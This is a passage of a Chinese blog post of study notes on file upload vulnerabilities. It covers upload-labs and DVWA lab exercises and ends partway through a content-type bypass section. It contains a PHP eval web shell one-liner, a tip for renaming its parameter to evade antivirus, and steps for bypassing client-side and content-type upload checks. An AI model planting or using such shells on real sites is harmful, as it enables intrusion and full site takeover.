<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content='00-文件上传简介 upload-labs 靶场 c0ny1/upload-labs\n蚁剑 第一个Shell (yuque.com)\n文件上传通常要上传如 php asp 这种文件，服务器在你访问上传的文件后，对文件进行解析/执行。\n比如你上传了xxx.php ,然后你访问这个文件，这样服务器就会执行你的代码，配合蚁剑你就可以控制整个网站的文件内容。\nupload-labs 打法这里还有个博客，(34条消息) upload-labs通关大全（已完结）_仙女象的博客-CSDN博客\nphp 例子 为了理解文件上传，请搭建phpstudy环境，自己运行下面的 html 和 php\n<form action="upload.php" method="post" enctype="multipart/form-data"> <label for="file">Filename:</label> <input type="file" name="file" id="file" /> <br /> <input type="submit" name="submit" value="Submit" /> </form> <form action="upload.php" 这里的 upload.php 可以修改成任何网址，对其他网站进行上传。\nenctype="multipart/form-data" 这句保留，表示上传为二进制格式。\n文件上传代码 $_FILES["file"]["error"] == 0 时代表正常无错误\n0; 没有错误发生，文件上传成功。 1; 上传的文件超过了php.ini 中upload_max_filesize 选项限制的值。 2; 上传文件的大小超过了HTML 表单中MAX_FILE_SIZE 选项指定的值。 3; 文件只有部分被上传。 4; 没有文件被上传。 如果正常上传后会把文件各种属性和 放置位置 打印。 <?php if ($_FILES["file"]["error"] > 0) { echo "Error: " . $_FILES["file"]["error"] . "<br />"; } else { echo "Upload: " . $_FILES["file"]["name"] . "<br />"; echo "Type: " . $_FILES["file"]["type"] . "<br />"; echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />"; echo "Stored in: " . $_FILES["file"]["tmp_name"]; } 文件上传的分类 任意文件上传漏洞 / 直接文件上传漏洞 （高危） 有条件的上传漏洞 权限认证没处理 上传逻辑有问题 中间件或者系统特性上传 如果攻击者能直接上传恶意脚本到网站存放的目录，且这个目录可解析动态脚本语言，那么攻击者就能够直接获取网站权限\n'><title>文件上传漏洞笔记</title><link rel=canonical href=https://b.cornradio.org/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/><link rel=stylesheet href=/scss/style.min.c4076f8b14226d5e742ff58db65b0a1f9aea382871ff11dd3cb87f3713cdcb6d.css><meta property='og:title' content="文件上传漏洞笔记"><meta property='og:description' content='00-文件上传简介 upload-labs 靶场 c0ny1/upload-labs\n蚁剑 第一个Shell (yuque.com)\n文件上传通常要上传如 php asp 这种文件，服务器在你访问上传的文件后，对文件进行解析/执行。\n比如你上传了xxx.php ,然后你访问这个文件，这样服务器就会执行你的代码，配合蚁剑你就可以控制整个网站的文件内容。\nupload-labs 打法这里还有个博客，(34条消息) upload-labs通关大全（已完结）_仙女象的博客-CSDN博客\nphp 例子 为了理解文件上传，请搭建phpstudy环境，自己运行下面的 html 和 php\n<form action="upload.php" method="post" enctype="multipart/form-data"> <label for="file">Filename:</label> <input type="file" name="file" id="file" /> <br /> <input type="submit" name="submit" value="Submit" /> </form> <form action="upload.php" 这里的 upload.php 可以修改成任何网址，对其他网站进行上传。\nenctype="multipart/form-data" 这句保留，表示上传为二进制格式。\n文件上传代码 $_FILES["file"]["error"] == 0 时代表正常无错误\n0; 没有错误发生，文件上传成功。 1; 上传的文件超过了php.ini 中upload_max_filesize 选项限制的值。 2; 上传文件的大小超过了HTML 表单中MAX_FILE_SIZE 选项指定的值。 3; 文件只有部分被上传。 4; 没有文件被上传。 如果正常上传后会把文件各种属性和 放置位置 打印。 <?php if ($_FILES["file"]["error"] > 0) { echo "Error: " . $_FILES["file"]["error"] . "<br />"; } else { echo "Upload: " . $_FILES["file"]["name"] . "<br />"; echo "Type: " . $_FILES["file"]["type"] . "<br />"; echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />"; echo "Stored in: " . $_FILES["file"]["tmp_name"]; } 文件上传的分类 任意文件上传漏洞 / 直接文件上传漏洞 （高危） 有条件的上传漏洞 权限认证没处理 上传逻辑有问题 中间件或者系统特性上传 如果攻击者能直接上传恶意脚本到网站存放的目录，且这个目录可解析动态脚本语言，那么攻击者就能够直接获取网站权限\n'><meta property='og:url' content='https://b.cornradio.org/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/'><meta property='og:site_name' content><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='渗透测试'><meta property='article:tag' content='upload-labs'><meta property='article:published_time' content='2023-07-31T20:59:37+08:00'><meta property='article:modified_time' content='2023-07-31T20:59:37+08:00'><meta name=twitter:title content="文件上传漏洞笔记"><meta name=twitter:description content='00-文件上传简介 upload-labs 靶场 c0ny1/upload-labs\n蚁剑 第一个Shell (yuque.com)\n文件上传通常要上传如 php asp 这种文件，服务器在你访问上传的文件后，对文件进行解析/执行。\n比如你上传了xxx.php ,然后你访问这个文件，这样服务器就会执行你的代码，配合蚁剑你就可以控制整个网站的文件内容。\nupload-labs 打法这里还有个博客，(34条消息) upload-labs通关大全（已完结）_仙女象的博客-CSDN博客\nphp 例子 为了理解文件上传，请搭建phpstudy环境，自己运行下面的 html 和 php\n<form action="upload.php" method="post" enctype="multipart/form-data"> <label for="file">Filename:</label> <input type="file" name="file" id="file" /> <br /> <input type="submit" name="submit" value="Submit" /> </form> <form action="upload.php" 这里的 upload.php 可以修改成任何网址，对其他网站进行上传。\nenctype="multipart/form-data" 这句保留，表示上传为二进制格式。\n文件上传代码 $_FILES["file"]["error"] == 0 时代表正常无错误\n0; 没有错误发生，文件上传成功。 1; 上传的文件超过了php.ini 中upload_max_filesize 选项限制的值。 2; 上传文件的大小超过了HTML 表单中MAX_FILE_SIZE 选项指定的值。 3; 文件只有部分被上传。 4; 没有文件被上传。 如果正常上传后会把文件各种属性和 放置位置 打印。 <?php if ($_FILES["file"]["error"] > 0) { echo "Error: " . $_FILES["file"]["error"] . "<br />"; } else { echo "Upload: " . $_FILES["file"]["name"] . "<br />"; echo "Type: " . $_FILES["file"]["type"] . "<br />"; echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />"; echo "Stored in: " . $_FILES["file"]["tmp_name"]; } 文件上传的分类 任意文件上传漏洞 / 直接文件上传漏洞 （高危） 有条件的上传漏洞 权限认证没处理 上传逻辑有问题 中间件或者系统特性上传 如果攻击者能直接上传恶意脚本到网站存放的目录，且这个目录可解析动态脚本语言，那么攻击者就能够直接获取网站权限\n'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_89f5b33c0fdcdd82.png width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/></a></h1><h2 class=site-description>本站使用imgur图床，需要科学上网方可查看图片</h2></div></header><ol class=menu-social><li><a href=https://appstore.cornradio.org/ target=_blank title=AppStore rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-shopping-bag"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6.331 8H17.67a2 2 0 011.977 2.304l-1.255 8.152A3 3 0 0115.426 21H8.574a3 3 0 01-2.965-2.544l-1.255-8.152A2 2 0 016.331 8z"/><path d="M9 11V6a3 3 0 016 0v5"/></svg></a></li><li><a href=/clock target=_blank title="online clock" rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-clock-hour-4"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-9 0a9 9 0 1018 0A9 9 0 103 12"/><path d="M12 12l3 2"/><path d="M12 7v5"/></svg></a></li><li><a href=/index.xml target=_blank title=rss rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=http://139.196.171.60/watchTV/a-plan/ target=_blank title="watchtv 139" rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-screen-share"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M21 12v3a1 1 0 01-1 1H4a1 1 0 01-1-1V5a1 1 0 011-1h9"/><path d="M7 20h10"/><path d="M9 16v4"/><path d="M15 16v4"/><path d="M17 4h4v4"/><path d="M16 9l5-5"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/friends-links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Friends Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#00-文件上传简介>00-文件上传简介</a><ol><li><a href=#php-例子>php 例子</a></li><li><a href=#文件上传代码>文件上传代码</a></li><li><a href=#文件上传的分类>文件上传的分类</a></li><li><a href=#文件上传漏洞的修复方案>文件上传漏洞的修复方案</a></li></ol></li><li><a href=#01-使用蚁剑>01-使用蚁剑</a></li><li><a href=#01-dvwa---upload-file>01-DVWA - upload file</a><ol><li><a href=#先看一下源代码>先看一下源代码</a></li><li><a href=#上传一个phpinfo>上传一个phpinfo</a></li></ol></li><li><a href=#02--绕过js文件类型检查>02- 绕过js文件类型检查</a><ol><li><a href=#方法1-修改html>方法1 修改html</a></li><li><a href=#方法2-抓包替换后缀名>方法2 抓包替换后缀名</a></li></ol></li><li><a href=#04-绕过content-type>04-绕过content-type</a><ol><li><a href=#使用burp绕过>使用burp绕过</a></li></ol></li><li><a href=#05-绕过简单黑名单>05-绕过简单黑名单</a></li><li><a href=#06-htaccess文件重写攻击>06-.htaccess文件重写攻击</a></li><li><a href=#07-大小写绕过>07-大小写绕过</a></li><li><a href=#08-空格绕过windows服务器点绕过>08-空格绕过、windows服务器点绕过</a><ol><li><a href=#空格绕过>空格绕过</a></li><li><a href=#windows服务器点绕过>windows服务器点绕过</a></li></ol></li><li><a href=#09-ntfs数据流绕过-data>09-NTFS数据流绕过 DATA</a><ol><li><a href=#数据流知识>数据流知识</a></li></ol></li><li><a href=#10-windows-叠加特征上传>10-windows 叠加特征上传</a></li><li><a href=#11-双写文件名>11-双写文件名</a></li><li><a href=#12-上传参数目录可控>12-上传参数目录可控</a><ol><li><a href=#get-方式>Get 方式</a></li><li><a href=#post-方式>Post 方式</a></li></ol></li><li><a href=#13-文件头检测绕过>13-文件头检测绕过</a><ol><li><a href=#基于真正的图片法>基于真正的图片法</a></li><li><a href=#抓包修改头部法>抓包修改头部法</a></li></ol></li><li><a href=#14-绕过图片二次渲染>14-绕过图片二次渲染</a></li><li><a href=#15-文件名可控绕过>15-文件名可控绕过</a></li><li><a href=#17-文件上传其他漏洞>17-文件上传其他漏洞</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/>文件上传漏洞笔记</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2023-07-31T20:59:37+08:00>Jul 31, 2023</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>阅读时长: 5 分钟</time></div></footer></div></header><section class=article-content><h2 id=00-文件上传简介>00-文件上传简介</h2><p>upload-labs 靶场 <a class=link href=https://github.com/c0ny1/upload-labs target=_blank rel=noopener>c0ny1/upload-labs</a></p><p>蚁剑 <a class=link href=https://www.yuque.com/antswordproject/antsword/qg3g73 target=_blank rel=noopener>第一个Shell (yuque.com)</a></p><p>文件上传通常要上传如 php asp 这种文件，服务器在你访问上传的文件后，对文件进行解析/执行。</p><p>比如你上传了xxx.php ,然后你访问这个文件，这样服务器就会执行你的代码，配合蚁剑你就可以控制整个网站的文件内容。</p><p>upload-labs 打法这里还有个博客，<a class=link href="https://blog.csdn.net/elephantxiang/article/details/120660685?spm=1001.2014.3001.5502" target=_blank rel=noopener>(34条消息) upload-labs通关大全（已完结）_仙女象的博客-CSDN博客</a></p><h3 id=php-例子>php 例子</h3><p>为了理解文件上传，请搭建phpstudy环境，自己运行下面的 html 和 php</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;upload.php&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;post&#34;</span> <span class=na>enctype</span><span class=o>=</span><span class=s>&#34;multipart/form-data&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=p>&lt;</span><span class=nt>label</span> <span class=na>for</span><span class=o>=</span><span class=s>&#34;file&#34;</span><span class=p>&gt;</span>Filename:<span class=p>&lt;/</span><span class=nt>label</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;file&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;file&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;file&#34;</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>	<span class=p>&lt;</span><span class=nt>br</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>	<span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;Submit&#34;</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span></code></pre></div><p><code>&lt;form action="upload.php"</code> 这里的 <code>upload.php</code> 可以修改成任何网址，对其他网站进行上传。</p><p><code>enctype="multipart/form-data"</code> 这句保留，表示上传为二进制格式。</p><h3 id=文件上传代码>文件上传代码</h3><p><code>$_FILES["file"]["error"]</code> == 0 时代表正常无错误</p><ul><li>0; 没有错误发生，文件上传成功。</li><li>1; 上传的文件超过了php.ini 中upload_max_filesize 选项限制的值。</li><li>2; 上传文件的大小超过了HTML 表单中MAX_FILE_SIZE 选项指定的值。</li><li>3; 文件只有部分被上传。</li><li>4; 没有文件被上传。
如果正常上传后会把文件各种属性和 放置位置 打印。</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;error&#34;</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;Error: &#34;</span> <span class=o>.</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;error&#34;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;&lt;br /&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;Upload: &#34;</span> <span class=o>.</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;&lt;br /&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;Type: &#34;</span> <span class=o>.</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;type&#34;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;&lt;br /&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;Size: &#34;</span> <span class=o>.</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;size&#34;</span><span class=p>]</span> <span class=o>/</span> <span class=mi>1024</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34; Kb&lt;br /&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;Stored in: &#34;</span> <span class=o>.</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=文件上传的分类>文件上传的分类</h3><ul><li>任意文件上传漏洞 / 直接文件上传漏洞 （高危）</li><li>有条件的上传漏洞</li><li>权限认证没处理</li><li>上传逻辑有问题</li><li>中间件或者系统特性上传</li></ul><p>如果攻击者能直接上传恶意脚本到网站存放的目录，且这个目录可解析动态脚本语言，那么攻击者就能够直接获取网站权限</p><h3 id=文件上传漏洞的修复方案>文件上传漏洞的修复方案</h3><ul><li>在网站中需要存在上传模块，需要做好权限认证，不能让匿名用户可访问。</li><li>文件上传目录设置为禁止脚本文件执行。这样设置即使被上传后门的动态脚本也不能解析，导致攻击者放弃这个攻击途径。</li><li>设置上传白名单，白名单只允许图片上传如，jpg png gif 其他文件均不允许上传</li><li>上传的后缀名，一定要设置成图片格式如 jpg png gif</li></ul><hr><h2 id=01-使用蚁剑>01-使用蚁剑</h2><ul><li><p>下载 <a class=link href=https://github.com/AntSwordProject/AntSword-Loader/releases target=_blank rel=noopener>https://github.com/AntSwordProject/AntSword-Loader/releases</a></p></li><li><p>安装的时候他会下载github文件并解压，如果卡住了就自行解压然后重新选择那个目录。</p></li><li><p>参考教程： 蚁剑 <a class=link href=https://www.yuque.com/antswordproject/antsword/qg3g73 target=_blank rel=noopener>第一个Shell (yuque.com)</a></p></li><li><p>上传文件</p><ul><li>因为ant总被火绒拦掉所以…… 我改成了Post ”ass“</li><li>上传文件内容：</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php eval($_POST[&#39;ass&#39;]);
</span></span></code></pre></div></li><li><p>新建站点
<img src=https://i.imgur.com/AiuKhN0.png loading=lazy alt=Imgur></p></li><li><p>可以修改/删除/浏览 web站点的所有文件。
<img src=https://i.imgur.com/sLFw53X.png loading=lazy alt=Imgur></p></li></ul><hr><h2 id=01-dvwa---upload-file>01-DVWA - upload file</h2><h3 id=先看一下源代码>先看一下源代码</h3><p>vulnerabilities/upload/source/low.php</p><p>如果接收到了上传请求，代码会将上传文件保存到指定的目录中。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;Upload&#39;</span> <span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Where are we going to be writing to?
</span></span></span><span class=line><span class=cl>    <span class=nv>$target_path</span>  <span class=o>=</span> <span class=nx>DVWA_WEB_PAGE_TO_ROOT</span> <span class=o>.</span> <span class=s2>&#34;hackable/uploads/&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$target_path</span> <span class=o>.=</span> <span class=nx>basename</span><span class=p>(</span> <span class=nv>$_FILES</span><span class=p>[</span> <span class=s1>&#39;uploaded&#39;</span> <span class=p>][</span> <span class=s1>&#39;name&#39;</span> <span class=p>]</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Can we move the file to the upload folder?
</span></span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span> <span class=o>!</span><span class=nx>move_uploaded_file</span><span class=p>(</span> <span class=nv>$_FILES</span><span class=p>[</span> <span class=s1>&#39;uploaded&#39;</span> <span class=p>][</span> <span class=s1>&#39;tmp_name&#39;</span> <span class=p>],</span> <span class=nv>$target_path</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// No
</span></span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s1>&#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// Yes!
</span></span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;</span><span class=si>{</span><span class=nv>$target_path</span><span class=si>}</span><span class=s2> succesfully uploaded!&lt;/pre&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err> 
</span></span></span></code></pre></div><h3 id=上传一个phpinfo>上传一个phpinfo</h3><p>上传phpinfo是为了非暴力测试，攻击的话要用一句话。
如果phpinfo执行了，Post其实也大差不差。</p><p>要上传的 php 的内容为</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>phpinfo</span><span class=p>();</span>
</span></span></code></pre></div><hr><h2 id=02--绕过js文件类型检查>02- 绕过js文件类型检查</h2><blockquote><p>适用范围：网站仅仅通过前端js代码进行文件后缀名检测</p></blockquote><p>Pass-01</p><h3 id=方法1-修改html>方法1 修改html</h3><ol><li>打开 F12 ，修改form 的 onsubmit ，删除 checkFile() 函数</li><li>重新上传php文件</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>enctype</span><span class=o>=</span><span class=s>&#34;multipart/form-data&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;post&#34;</span> <span class=na>onsubmit</span><span class=o>=</span><span class=s>&#34;return checkFile()&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>请选择要上传的图片：<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;&lt;</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;msg&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                            <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;&lt;</span><span class=nt>input</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;input_file&#34;</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;file&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;upload_file&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=p>&lt;</span><span class=nt>input</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;button&#34;</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;上传&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span></code></pre></div><h3 id=方法2-抓包替换后缀名>方法2 抓包替换后缀名</h3><ol><li>选择 1.jpg 文件上传（文件内容是php代码）</li><li>用抓包工具修改后post内容的文件后缀名（这时候payload 已经通过了js校验）</li></ol><p><img src=https://i.imgur.com/ofmgpwh.png loading=lazy alt=Imgur></p><hr><h2 id=04-绕过content-type>04-绕过content-type</h2><blockquote><p>适用范围：网站后台代码对上传文件de content-type 进行校验</p></blockquote><p>关键语句（php会对content-type进行验证）：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>((</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;upload_file&#39;</span><span class=p>][</span><span class=s1>&#39;type&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;image/jpeg&#39;</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;upload_file&#39;</span><span class=p>][</span><span class=s1>&#39;type&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;image/png&#39;</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;upload_file&#39;</span><span 